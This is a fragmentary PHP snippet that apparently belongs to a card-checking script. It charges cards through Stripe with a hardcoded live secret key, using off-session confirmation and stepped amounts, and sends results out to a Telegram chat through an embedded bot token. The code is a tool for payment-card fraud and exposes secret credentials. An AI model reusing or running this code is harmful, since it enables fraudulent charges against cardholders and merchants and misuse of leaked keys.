...
$text = urlencode($msg);
file_get_contents("https://api.telegram.org/bot6429819926:AAG00ie67MVR-VI8o7T-Zt6JiBQGkcDhMqE/sendMessage?chat_id=$userid&text=$text&parse_mode=HTML");
...
$prev = $chr -10;
$next = $chr +10;
$sk ='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';
...
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=gbp&payment_method_types[]=card&description=undefy&payment_method='.$tok1.'&confirm=true&off_session=true');  
